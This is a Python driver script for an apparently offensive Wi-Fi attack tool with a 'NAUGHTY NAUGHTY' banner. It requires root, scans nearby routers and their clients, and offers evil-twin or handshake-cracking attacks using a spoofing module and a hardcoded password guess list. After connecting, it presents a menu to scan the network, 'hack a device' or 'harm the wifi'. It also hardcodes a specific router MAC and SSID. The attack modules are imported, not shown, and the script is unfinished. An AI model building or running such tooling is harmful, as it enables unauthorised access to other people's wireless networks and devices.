from platform import system
import os
import sys
import requests
import wifimangement_linux as wifi 
import netifaces
from getmac import get_mac_address

from interface import Interface
from scanner import Scanner
from spoofer import Spoofer
from crack import Crack
from router import Router

def exit(msg):
    print(msg)
    sys.exit(0)

def ascii():
    print("""

███╗░░██╗░█████╗░██╗░░░██╗░██████╗░██╗░░██╗████████╗██╗░░░██╗  ███╗░░██╗░█████╗░██╗░░░██╗░██████╗░██╗░░██╗████████╗██╗░░░██╗
████╗░██║██╔══██╗██║░░░██║██╔════╝░██║░░██║╚══██╔══╝╚██╗░██╔╝  ████╗░██║██╔══██╗██║░░░██║██╔════╝░██║░░██║╚══██╔══╝╚██╗░██╔╝
██╔██╗██║███████║██║░░░██║██║░░██╗░███████║░░░██║░░░░╚████╔╝░  ██╔██╗██║███████║██║░░░██║██║░░██╗░███████║░░░██║░░░░╚████╔╝░
██║╚████║██╔══██║██║░░░██║██║░░╚██╗██╔══██║░░░██║░░░░░╚██╔╝░░  ██║╚████║██╔══██║██║░░░██║██║░░╚██╗██╔══██║░░░██║░░░░░╚██╔╝░░
██║░╚███║██║░░██║╚██████╔╝╚██████╔╝██║░░██║░░░██║░░░░░░██║░░░  ██║░╚███║██║░░██║╚██████╔╝╚██████╔╝██║░░██║░░░██║░░░░░░██║░░░
╚═╝░░╚══╝╚═╝░░╚═╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ╚═╝░░╚══╝╚═╝░░╚═╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░
 """)

def check_root():
    osversion = system()
    print ("Operating System: %s" %osversion)

    if osversion == 'Linux':
        if os.geteuid() != 0:
            exit("You need to be root to run this script!")
    else:
        exit("This script only works on Linux OS! Exiting!")

def check_wifi():
    url = "http://www.kite.com"
    timeout = 5
    try:
        requests.get(url, timeout=timeout)
        return True
    except (requests.ConnectionError, requests.Timeout) as exception:
        return False

    
if __name__ == "__main__":
    ascii()
    check_root()

    interface = Interface("wlan0")
    scanner =  Scanner(interface)
    router = None
    devices = []

    if not check_wifi():
        routers = scanner.scan_routers()
        for index in range(len(routers)):
            print(str(index)+" - ", end="")
            print(routers[index])
        
        router_num = input("choose a router number: ")
        router = routers[int(router_num)]
        
        devices = scanner.scan_devices_outside(router)
        for index in range(len(devices)):
            print(str(index)+" - ", end="")
            print(devices[index].get_mac())
        
        device_num = input("choose a device number: ")
        device = devices[int(device_num)]
        
        eh = input("evil twin or half handsketch? (e/h): ")
        if eh == "e":
            print("evil twin")
        else:      
            print("half handsketch")
            spoofer = Spoofer(interface)
            #spoofer.deauthentication(router, device, 5)

            crack = Crack()
            password = crack.run(interface, router, ["verint","verint1!","verint11","verint!1","verint21"], device, spoofer)
    
        wifi.connect(router.get_ssid(),password)

    if check_wifi():
        
        print("wifi is on")
        
        if router == None:
            router = Router("14:ae:db:a3:22:95", 6, "BezeqNK") # for now

        
        option = input("1 - scan for devices in the network\n2 - hack a device\n3 - harm the wifi\n")
        if option == "1":
            devices = scanner.scan_devies_inside(router)
            for index in range(len(devices)):
                print(str(index)+" - ", end="")
                print(devices[index])
        
        option = input("choose device:")
        
            

        
